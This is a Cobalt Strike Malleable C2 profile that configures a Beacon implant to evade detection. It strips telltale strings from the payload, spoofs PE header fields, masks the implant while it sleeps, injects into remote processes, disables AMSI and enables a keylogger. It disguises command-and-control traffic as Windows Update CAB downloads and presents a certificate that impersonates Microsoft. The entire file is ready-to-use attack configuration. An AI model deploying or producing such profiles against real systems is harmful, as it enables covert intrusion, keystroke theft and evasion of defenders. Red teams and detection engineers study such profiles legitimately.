
set host_stage "true";
set sleeptime "30000";
set jitter    "40";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; eraybfhe; Trident/7.0; rv:11.0) like Gecko";

# Task and Proxy Max Size
set tasks_max_size "1048576";
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

set data_jitter "50";
set smb_frame_header "";
set pipename "epmapper-6435";
set pipename_stager "epmapper-1430";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 19.10.0 LTS (GNU/Linux 4.4.0-19037-aws x86_64)";
set ssh_pipename "epmapper-##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}



stage {
	set obfuscate "true";
	set stomppe "true";
	set cleanup "true";
	set userwx "false";
	set smartinject "true";
	

	#TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
	#They will also obfuscate themselves while they wait to read information from their parent Beacon.
	set sleep_mask "true";
	

	set checksum       "83724";
	set compile_time   "05 Aug 2020 16:06:20";
	set entry_point    "5664";
	set name           "umppc.dll";
	set rich_header    "\xba\xf0\x63\x99\xfe\x91\x0d\xca\xfe\x91\x0d\xca\xfe\x91\x0d\xca\x92\xf9\x0e\xcb\xff\x91\x0d\xca\x92\xf9\x05\xcb\xf3\x91\x0d\xca\x9b\xf7\x0e\xcb\xfc\x91\x0d\xca\x9b\xf7\x09\xcb\xfb\x91\x0d\xca\x9b\xf7\x0c\xcb\xfd\x91\x0d\xca\xfe\x91\x0c\xca\xc6\x91\x0d\xca\x92\xf9\x0d\xcb\xff\x91\x0d\xca\x92\xf9\xf2\xca\xff\x91\x0d\xca\x92\xf9\x0f\xcb\xff\x91\x0d\xca\x52\x69\x63\x68\xfe\x91\x0d\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	
	
	
	transform-x86 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "NtQueueApcThread" "";
		strrep "HTTP/1.1 200 OK" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";

		}

	transform-x64 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "beacon.x64.dll" "";
		strrep "NtQueueApcThread" "";
		strrep "HTTP/1.1 200 OK" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";
		}
}


process-inject {
    # set remote memory allocation technique
	set allocator "NtMapViewOfSection";

    # shape the content and properties of what we will inject
    set min_alloc "17387";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
		CreateThread "ntdll.dll!RtlUserThreadStart+0x2457";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
		CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
	}
}

post-ex {
    # control the temporary process we spawn to
	
	set spawnto_x86 "%windir%\\syswow64\\auditpol.exe";
	set spawnto_x64 "%windir%\\sysnative\\auditpol.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
	
	# control the method used to log keystrokes 
	set keylogger "SetWindowsHookEx";
}

	
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "false";			
}

http-get {
set uri "/c/msdownload/update/others/2021/10/cJHIyQ293IkcB1 /c/msdownload/update/others/2021/10/67ZA3QBIzzMi5xH28-u22Jwn /c/msdownload/update/others/2021/10/o6njJC0lJF8WII8qCWBKnGA /c/msdownload/update/others/2021/10/KrI0K0I6aJybzAnZqnpgGzi /c/msdownload/update/others/2021/10/pDECtFdZYDu7qAXpIwn5bobSc /c/msdownload/update/others/2021/10/SbQOsw0Fa02DoH23 /c/msdownload/update/others/2021/10/t-whOM5o8eNRNSgQ5byNQtXnD0 /c/msdownload/update/others/2021/10/4tbmV-HbGlrPSCJJtooEgZ1p /c/msdownload/update/others/2021/10/hmO8-Teb04J8X6tT0npTJFFRj7 /c/msdownload/update/others/2021/10/DWQyd1NjjFSbsL3CcELl3wt /c/msdownload/update/others/2021/10/Tsr5FyMSdm7epL /c/msdownload/update/others/2021/10/4tPFYB3ZbUVrUmRRYD1T /c/msdownload/update/others/2021/10/dgTMhgHbE88lLefpGNV /c/msdownload/update/others/2021/10/ewbnu2GcmF-zXJBvzmRN /c/msdownload/update/others/2021/10/BQJk12Ik-0N7bFGwVJyH5Myhp /c/msdownload/update/others/2021/10/tccWAKuO5QGrP8D6wMZ /c/msdownload/update/others/2021/10/1OfqhkQFHOSVp3G /c/msdownload/update/others/2021/10/tijRxVChOjM7EdUeADoIHvidWQ /c/msdownload/update/others/2021/10/mz9C1j0dLEFgZ2 ";



client {

	header "Accept" "*/*";
	header "Host" "taxpros.com";
	
	metadata {
		netbios;
		append ".cab";
		uri-append;
	}
}


server {
	header "Content-Type" "application/vnd.ms-cab-compressed";
	header "Server" "Microsoft-IIS/8.5";
	header "MSRegion" "N. America";
	header "Connection" "keep-alive";
	header "X-Powered-By" "ASP.NET";

	output {

		print;
	}
}
}

http-post {
set uri "/c/msdownload/update/others/2021/10/v9MREahMtkNO37jqXcfAUjwcTI /c/msdownload/update/others/2021/10/js6qpfT-FhKFzMz0WME /c/msdownload/update/others/2021/10/simPChmJY9i6st /c/msdownload/update/others/2021/10/kv2IgOVsfzDDfPuWfJ /c/msdownload/update/others/2021/10/nAYq1lGuALB9Z4QEvr6UZEs /c/msdownload/update/others/2021/10/3fNFHS6--Pri8oaTj0EZ4fITc /c/msdownload/update/others/2021/10/egDPivbsf2WTx82VsVhXCFxY /c/msdownload/update/others/2021/10/UEa0QML3gvtnPF1Rdz /c/msdownload/update/others/2021/10/TB3ZPnL91iO82tcdql2XRQoHlHP /c/msdownload/update/others/2021/10/lmgghkNQxSN8XMlDn /c/msdownload/update/others/2021/10/tSBpR51dcmtZJMaS3D5xuWnKvX /c/msdownload/update/others/2021/10/bZDIevWeQuPtgTbHOkTTu8 /c/msdownload/update/others/2021/10/lhZUqgi6EBT9Vy /c/msdownload/update/others/2021/10/2206XrE2HEq1BWgV13eaOEkcOK /c/msdownload/update/others/2021/10/NpHtInlQ6ZNaBgPf /c/msdownload/update/others/2021/10/KSvFWuOPvUEc77DU53nqRB /c/msdownload/update/others/2021/10/ROzIA9gTWMkSA22IEHwZIT7xr /c/msdownload/update/others/2021/10/uNjyIuOwMUOGVvG703ms ";


set verb "GET";

client {

	header "Accept" "*/*";


	id {
		prepend "download.windowsupdate.com/c/";
		header "Host";
	}


	output {
		netbios;
		append ".cab";
		uri-append;
	}
}

server {
	header "Content-Type" "application/vnd.ms-cab-compressed";
	header "Server" "Microsoft-IIS/8.5";
	header "MSRegion" "N. America";
	header "Connection" "keep-alive";
	header "X-Powered-By" "ASP.NET";

	output {
		print;
	}
}
}

http-stager {
	server {
		header "Content-Type" "application/vnd.ms-cab-compressed";
	}
}

	
https-certificate {set CN       "taxpros.com"; #Common Name
set O        "Microsoft Corporation"; #Organization Name
set C        "US"; #Country
set L        "Redmond"; #Locality
set OU       "Microsoft IT"; #Organizational Unit Name
set ST       "WA"; #State or Province
set validity "365"; #Number of days the cert is valid for
}

	
